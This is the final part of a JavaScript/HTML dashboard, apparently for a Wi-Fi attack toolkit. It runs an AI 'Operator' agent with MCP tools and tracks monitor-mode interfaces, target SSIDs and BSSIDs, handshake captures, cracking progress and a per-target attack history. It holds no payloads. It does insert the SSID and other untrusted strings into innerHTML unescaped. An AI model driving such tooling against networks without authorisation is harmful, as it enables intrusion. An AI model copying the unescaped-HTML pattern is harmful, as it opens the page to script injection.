                                break;
                            
                            case 'text_delta':
                                fullResponse += data.text;
                                streamDiv.innerHTML = formatOperatorResponse(fullResponse);
                                floatStreamDiv.innerHTML = formatOperatorResponse(fullResponse);
                                // Auto-scroll
                                document.getElementById('operatorMainMessages').scrollTop = 
                                    document.getElementById('operatorMainMessages').scrollHeight;
                                document.getElementById('operatorMessages').scrollTop = 
                                    document.getElementById('operatorMessages').scrollHeight;
                                break;
                            
                            case 'tool_start':
                                toolCount++;
                                addToolLog('üîß ' + data.tool, '#ffcc00');
                                streamDiv.innerHTML = formatOperatorResponse(fullResponse) + 
                                    '<div style="color: #ffcc00; font-size: 12px; margin-top: 8px;">üîß Using: ' + data.tool + '...</div>';
                                floatStreamDiv.innerHTML = streamDiv.innerHTML;
                                break;
                            
                            case 'tool_input':
                                addToolLog('   Input: ' + JSON.stringify(data.input).substring(0, 100), '#888');
                                break;
                            
                            case 'tool_executing':
                                streamDiv.innerHTML = formatOperatorResponse(fullResponse) + 
                                    '<div style="color: #ffcc00; font-size: 12px; margin-top: 8px;">‚ö° Executing: ' + data.tool + '...</div>';
                                floatStreamDiv.innerHTML = streamDiv.innerHTML;
                                break;
                            
                            case 'tool_result':
                                addToolLog('   ‚úì Result: ' + data.result.substring(0, 100) + (data.result.length > 100 ? '...' : ''), '#00ff00');
                                break;
                            
                            case 'tool_error':
                                addToolLog('   ‚úó Error: ' + data.error, '#ff0000');
                                break;
                            
                            case 'done':
                                streamDiv.innerHTML = formatOperatorResponse(data.full_response);
                                floatStreamDiv.innerHTML = formatOperatorResponse(data.full_response);
                                if (toolCount > 0) {
                                    addToolLog('‚îÄ‚îÄ‚îÄ Done (' + toolCount + ' tools used) ‚îÄ‚îÄ‚îÄ', '#666');
                                }
                                loadConversations(); // Refresh list for name update
                                break;
                            
                            case 'error':
                                streamDiv.innerHTML = '<span style="color: #ff6666;">‚ö†Ô∏è Error: ' + data.error + '</span>';
                                floatStreamDiv.innerHTML = streamDiv.innerHTML;
                                console.error('Operator error:', data.trace);
                                break;
                        }
                    } catch (e) {
                        console.error('Failed to parse SSE:', line, e);
                    }
                }
            }
        }
        
        resetOperatorButtons();
        if (toolCount === 0) {
            document.getElementById('toolActivityPanel').style.display = 'none';
        }
        
    } catch (error) {
        if (error.name === 'AbortError') {
            streamDiv.innerHTML = formatOperatorResponse(fullResponse) + 
                '<div style="color: #ff6666; margin-top: 8px;">‚èπ Response stopped</div>';
            floatStreamDiv.innerHTML = streamDiv.innerHTML;
        } else {
            streamDiv.innerHTML = '<span style="color: #ff6666;">‚ö†Ô∏è Connection error: ' + error + '</span>';
            floatStreamDiv.innerHTML = streamDiv.innerHTML;
        }
        resetOperatorButtons();
    }
}

function addToolLog(text, color) {
    const log = document.getElementById('toolActivityLog');
    const entry = document.createElement('div');
    entry.style.color = color || '#888';
    entry.style.marginBottom = '2px';
    entry.style.fontFamily = 'monospace';
    entry.style.fontSize = '11px';
    entry.style.whiteSpace = 'pre-wrap';
    entry.style.wordBreak = 'break-all';
    entry.textContent = text;
    log.appendChild(entry);
    log.scrollTop = log.scrollHeight;
}

function resetOperatorButtons() {
    document.getElementById('operatorSendBtn').style.display = 'inline-block';
    document.getElementById('operatorStopBtn').style.display = 'none';
    document.getElementById('toolActivityPanel').style.display = 'none';
    operatorAbortController = null;
}

function stopOperatorResponse() {
    if (operatorAbortController) {
        operatorAbortController.abort();
    }
    if (operatorThinkingInterval) {
        clearInterval(operatorThinkingInterval);
        operatorThinkingInterval = null;
    }
    resetOperatorButtons();
    resetFloatButtons();
}

function addOperatorMessageMain(role, content) {
    const messages = document.getElementById('operatorMainMessages');
    
    // Clear welcome message if present
    if (messages.children.length === 1 && messages.innerHTML.includes('Ask me anything')) {
        messages.innerHTML = '';
    }
    
    const div = document.createElement('div');
    div.style.marginBottom = '15px';
    div.style.padding = '12px 16px';
    div.style.borderRadius = '8px';
    div.style.maxWidth = '85%';
    
    if (role === 'user') {
        div.style.background = '#002200';
        div.style.color = '#00ff00';
        div.style.marginLeft = 'auto';
        div.innerHTML = '<strong>You:</strong> ' + escapeHtml(content);
    } else if (role === 'assistant') {
        div.style.background = '#1a1a1a';
        div.style.color = '#00cc00';
        div.style.marginRight = 'auto';
        div.style.borderLeft = '3px solid #00ff00';
        div.innerHTML = formatOperatorResponse(content);
    } else {
        div.style.background = '#221100';
        div.style.color = '#ffaa00';
        div.style.textAlign = 'center';
        div.style.maxWidth = '100%';
        div.innerHTML = content;
    }
    
    messages.appendChild(div);
    messages.scrollTop = messages.scrollHeight;
}

// Inject prompt into input
function injectPrompt(text) {
    const input = document.getElementById('operatorMainInput');
    input.value = text;
    input.focus();
}

// Load context panel
async function loadOperatorContext() {
    try {
        const response = await fetch('/api/context');
        const ctx = await response.json();
        
        // Interfaces
        let ifaceHtml = '';
        for (const [name, mode] of Object.entries(ctx.interfaces || {})) {
            const color = mode === 'monitor' ? '#0f0' : (mode === 'managed' ? '#888' : '#f00');
            ifaceHtml += '<div style="color: ' + color + '">' + name + ': ' + mode + '</div>';
        }
        document.getElementById('ctxInterfaces').innerHTML = ifaceHtml || 'None detected';
        
        // Glass
        const g = ctx.glass || {};
        if (g.connected) {
            let glassHtml = '<div style="color: ' + (g.running ? '#0f0' : '#888') + '">' + (g.running ? '‚ö° Running' : '‚è∏Ô∏è Idle') + '</div>';
            if (g.file && g.file !== '-') {
                glassHtml += '<div style="color: #888; font-size: 11px;">' + g.file.substring(0, 30) + '...</div>';
            }
            if (g.progress && g.progress !== '-') {
                glassHtml += '<div>Progress: ' + g.progress + '</div>';
            }
            if (g.eta && g.eta !== '-') {
                glassHtml += '<div style="color: #888; font-size: 11px;">ETA: ' + g.eta + '</div>';
            }
            document.getElementById('ctxGlass').innerHTML = glassHtml;
        } else {
            document.getElementById('ctxGlass').innerHTML = '<div style="color: #f00;">Not connected</div>';
        }
        
        // Target
        const t = ctx.selected_target || {};
        if (t.ssid) {
            document.getElementById('ctxTarget').innerHTML = '<div>' + t.ssid + '</div><div style="color: #888; font-size: 11px;">' + (t.bssid || '') + '</div>';
        } else {
            document.getElementById('ctxTarget').innerHTML = '<div style="color: #666;">None selected</div>';
        }
        
        // Captures
        const caps = ctx.captures || [];
        if (caps.length > 0) {
            let capsHtml = '';
            caps.slice(0, 5).forEach(c => {
                capsHtml += '<div style="margin-bottom: 3px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">' + c + '</div>';
            });
            document.getElementById('ctxCaptures').innerHTML = capsHtml;
        } else {
            document.getElementById('ctxCaptures').innerHTML = '<div style="color: #666;">None</div>';
        }
        
    } catch (error) {
        console.error('Failed to load context:', error);
    }
}

async function resetPrompt() {
    if (!confirm('Reset to default J4Rv15 prompt? This will discard any custom changes.')) return;
    
    try {
        const response = await fetch('/api/operator/prompt/reset', { method: 'POST' });
        const result = await response.json();
        if (result.success) {
            loadPrompt();
            document.getElementById('promptStatus').textContent = 'Reset to default!';
        }
    } catch (error) {
        alert('Error resetting prompt: ' + error);
    }
}

async function viewPrompt() {
    try {
        const response = await fetch('/api/operator/prompt');
        if (response.status === 401) {
            alert('Not authenticated');
            return;
        }
        const data = await response.json();
        document.getElementById('promptEditor').value = data.prompt || '';
        document.getElementById('promptStatus').textContent = data.source === 'custom' ? 'Custom prompt loaded' : 'Default prompt loaded';
        document.getElementById('promptModal').style.display = 'flex';
    } catch (error) {
        alert('Error loading prompt: ' + error);
    }
}

function editPrompt() {
    viewPrompt(); // Same thing - opens the modal for editing
}

async function savePrompt() {
    const prompt = document.getElementById('promptEditor').value.trim();
    if (!prompt) {
        alert('Prompt cannot be empty');
        return;
    }
    
    try {
        const response = await fetch('/api/operator/prompt', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ prompt: prompt })
        });
        const result = await response.json();
        if (result.success) {
            document.getElementById('promptStatus').textContent = 'Saved!';
            setTimeout(() => closePromptModal(), 1000);
        } else {
            alert('Failed to save: ' + result.error);
        }
    } catch (error) {
        alert('Error saving prompt: ' + error);
    }
}

function closePromptModal() {
    document.getElementById('promptModal').style.display = 'none';
}

// Load facts for settings panel
async function loadFacts() {
    try {
        const response = await fetch('/api/operator/facts');
        const data = await response.json();
        
        const factsList = document.getElementById('factsList');
        if (data.facts && data.facts.length > 0) {
            factsList.innerHTML = data.facts.map((f, i) => 
                '<div style="display: flex; justify-content: space-between; margin-bottom: 5px; padding: 5px; background: #111; border-radius: 4px;">' +
                '<span style="color: #0f0;">' + escapeHtml(f) + '</span>' +
                '<button onclick="removeFact(' + i + ')" style="background: none; border: none; color: #f66; cursor: pointer;" title="Remove this fact">√ó</button>' +
                '</div>'
            ).join('');
        } else {
            factsList.innerHTML = '<div style="color: #666; font-style: italic;">No facts saved yet</div>';
        }
    } catch (error) {
        console.error('Failed to load facts:', error);
    }
}

async function addFact() {
    const input = document.getElementById('newFactInput');
    const fact = input.value.trim();
    if (!fact) return;
    
    try {
        await fetch('/api/operator/remember', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ fact: fact })
        });
        input.value = '';
        loadFacts();
    } catch (error) {
        console.error('Failed to add fact:', error);
    }
}

async function removeFact(index) {
    try {
        const response = await fetch('/api/operator/facts/remove', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ index: index })
        });
        const result = await response.json();
        if (result.success) {
            loadFacts();
        } else {
            alert('Failed to remove fact: ' + result.error);
        }
    } catch (error) {
        alert('Error removing fact: ' + error);
    }
}

// Load tools list
async function loadTools() {
    try {
        const response = await fetch('/api/operator/tools');
        const data = await response.json();
        
        if (data.error) {
            document.getElementById('toolsList').innerHTML = '<div style="color: #f00;">Error: ' + data.error + '</div>';
            return;
        }
        
        let html = '<div style="color: #0f0; margin-bottom: 8px;">‚úì ' + data.total + ' tools available</div>';
        
        for (const [server, tools] of Object.entries(data.servers || {})) {
            html += '<div style="color: #888; margin-top: 8px; margin-bottom: 4px; font-weight: bold;">' + server + ' (' + tools.length + ')</div>';
            tools.slice(0, 5).forEach(t => {
                const shortName = t.name.split('_').slice(1).join('_');
                html += '<div style="color: #666; margin-left: 10px; font-size: 10px;">' + shortName + '</div>';
            });
            if (tools.length > 5) {
                html += '<div style="color: #444; margin-left: 10px; font-size: 10px;">...and ' + (tools.length - 5) + ' more</div>';
            }
        }
        
        document.getElementById('toolsList').innerHTML = html;
    } catch (error) {
        document.getElementById('toolsList').innerHTML = '<div style="color: #f00;">Failed to load</div>';
    }
}

async function refreshTools() {
    document.getElementById('toolsList').innerHTML = '<div style="color: #888;">Reconnecting MCP servers...</div>';
    try {
        const response = await fetch('/api/operator/tools/refresh', { method: 'POST' });
        const result = await response.json();
        if (result.success) {
            loadTools();
        } else {
            document.getElementById('toolsList').innerHTML = '<div style="color: #f00;">Refresh failed: ' + result.error + '</div>';
        }
    } catch (error) {
        document.getElementById('toolsList').innerHTML = '<div style="color: #f00;">Refresh failed</div>';
    }
}

// Memory search
async function searchMemories() {
    const query = document.getElementById('memorySearch').value.trim();
    if (query.length < 2) {
        document.getElementById('memoryResults').innerHTML = '<div style="text-align: center; padding: 20px; color: #666;">Type to search...</div>';
        return;
    }
    
    // TODO: Add backend RAG search endpoint
    document.getElementById('memoryResults').innerHTML = '<div style="text-align: center; padding: 20px; color: #666;">Search coming soon (needs ChromaDB)</div>';
}

// New conversation
// Create new conversation
async function newOperatorConversation() {
    try {
        const response = await fetch('/api/operator/conversations/new', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'}
        });
        const data = await response.json();
        if (data.success) {
            // Clear the chat display
            document.getElementById('operatorMainMessages').innerHTML = '<div style="color: #666; text-align: center; padding: 40px;">New conversation started</div>';
            loadConversations();
        }
    } catch (e) {
        console.error('New conversation error:', e);
    }
}

// Load conversation list
async function loadConversations(alsoLoadActive = false) {
    try {
        const response = await fetch('/api/operator/conversations');
        const data = await response.json();
        const list = document.getElementById('conversationList');
        if (!list) return;
        
        if (!data.conversations || data.conversations.length === 0) {
            list.innerHTML = '<div style="color: #666; text-align: center; padding: 10px;">No conversations yet</div>';
            return;
        }
        
        list.innerHTML = data.conversations.map(conv => {
            const isActive = conv.id === data.active;
            const date = conv.updated ? new Date(conv.updated).toLocaleDateString() : '';
            return `
                <div onclick="loadConversation('${conv.id}')" style="padding: 10px; margin-bottom: 5px; background: ${isActive ? '#002200' : '#111'}; border: 1px solid ${isActive ? '#006600' : '#333'}; cursor: pointer; border-radius: 3px; position: relative;" title="Click to load this conversation">
                    <button onclick="event.stopPropagation(); deleteConversation('${conv.id}')" style="position: absolute; top: 5px; right: 5px; background: #300; border: 1px solid #600; color: #f66; cursor: pointer; font-size: 12px; padding: 2px 6px; border-radius: 3px;" title="Delete this conversation">‚úï</button>
                    <div style="color: ${isActive ? '#0f0' : '#888'}; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; padding-right: 25px;">${conv.name || 'Untitled'}</div>
                    <div style="font-size: 10px; color: #555; margin-top: 3px;">${date} ¬∑ ${conv.message_count || 0} msgs</div>
                </div>
            `;
        }).join('');
        
        // Also load active conversation messages on init
        if (alsoLoadActive && data.active) {
            loadConversation(data.active);
        }
    } catch (e) {
        console.error('Load conversations error:', e);
    }
}

// Load specific conversation
async function loadConversation(convId) {
    try {
        const response = await fetch('/api/operator/conversations/load', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({id: convId})
        });
        const data = await response.json();
        if (data.success) {
            // Display messages
            const output = document.getElementById('operatorMainMessages');
            if (data.messages && data.messages.length > 0) {
                output.innerHTML = data.messages.map(msg => {
                    if (msg.role === 'user') {
                        return `<div style="margin-bottom: 15px; padding: 10px; background: #001100; border-left: 3px solid #006600;"><strong style="color: #0f0;">You:</strong><br>${escapeHtml(msg.content)}</div>`;
                    } else {
                        return `<div style="margin-bottom: 15px; padding: 10px; background: #0a0a0a; border-left: 3px solid #333;">${formatOperatorResponse(msg.content)}</div>`;
                    }
                }).join('');
                output.scrollTop = output.scrollHeight;
            } else {
                output.innerHTML = '<div style="color: #666; text-align: center; padding: 40px;">Empty conversation</div>';
            }
            loadConversations(); // Refresh list to show active
        }
    } catch (e) {
        console.error('Load conversation error:', e);
    }
}

// Delete conversation
async function deleteConversation(convId) {
    if (!confirm('Delete this conversation?')) return;
    try {
        const response = await fetch('/api/operator/conversations/delete', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({id: convId})
        });
        const data = await response.json();
        if (data.success) {
            loadConversations();
        }
    } catch (e) {
        console.error('Delete conversation error:', e);
    }
}

// Clear all (from settings)
async function clearOperatorFull() {
    if (confirm('Clear ALL conversation history? Facts will be kept.')) {
        await clearOperator();
        loadConversations();
    }
}

// Initialize Operator page when shown
function initOperatorPage() {
    loadOperatorMode();
    loadConversations(true);
    loadOperatorContext();
    loadFacts();
    loadTools();
    
    // Refresh context every 10 seconds when on page
    if (!window.operatorContextInterval) {
        window.operatorContextInterval = setInterval(() => {
            if (document.getElementById('page-operator').classList.contains('active')) {
                loadOperatorContext();
            }
        }, 10000);
    }
}

// Hook into page navigation
const originalShowPage = showPage;
showPage = function(pageName) {
    originalShowPage(pageName);
    if (pageName === 'operator') {
        initOperatorPage();
    }
};

</script>

<!-- Target Notes Modal -->
<div id="targetNotesModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center;">
    <div style="background:#111; border:1px solid #333; padding:20px; width:450px; max-height:80vh; overflow-y:auto; border-radius:5px;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <h3 style="margin:0; color:#0f0;" id="modalTargetTitle">Target Notes</h3>
            <button onclick="closeNotesModal()" style="background:none; border:none; color:#666; font-size:20px; cursor:pointer;" title="Close modal">‚úï</button>
        </div>
        <div style="font-size:12px; color:#888; margin-bottom:15px;" id="modalTargetInfo">BSSID: --</div>
        
        <label style="color:#0f0; font-size:12px;">Notes:</label>
        <textarea id="modalNotes" style="width:100%; height:80px; background:#0a0a0a; border:1px solid #333; color:#0f0; padding:8px; margin:5px 0 15px 0; box-sizing:border-box; resize:vertical;" placeholder="Add notes about this target..."></textarea>
        
        <label style="color:#0f0; font-size:12px;">Attack History:</label>
        <div id="modalAttackHistory" style="background:#0a0a0a; border:1px solid #333; padding:10px; margin:5px 0 15px 0; max-height:150px; overflow-y:auto; font-size:11px;">
            <div style="color:#666;">No attacks logged</div>
        </div>
        
        <div style="display:flex; gap:10px;">
            <button onclick="saveTargetNote()" style="flex:1; padding:10px; background:#002200; border:1px solid #006600; color:#0f0; cursor:pointer;" title="Save notes for this target">üíæ Save Note</button>
            <button onclick="closeNotesModal()" style="flex:1; padding:10px; background:#1a1a1a; border:1px solid #333; color:#888; cursor:pointer;" title="Close without saving">Cancel</button>
        </div>
    </div>
</div>

</body>
</html>
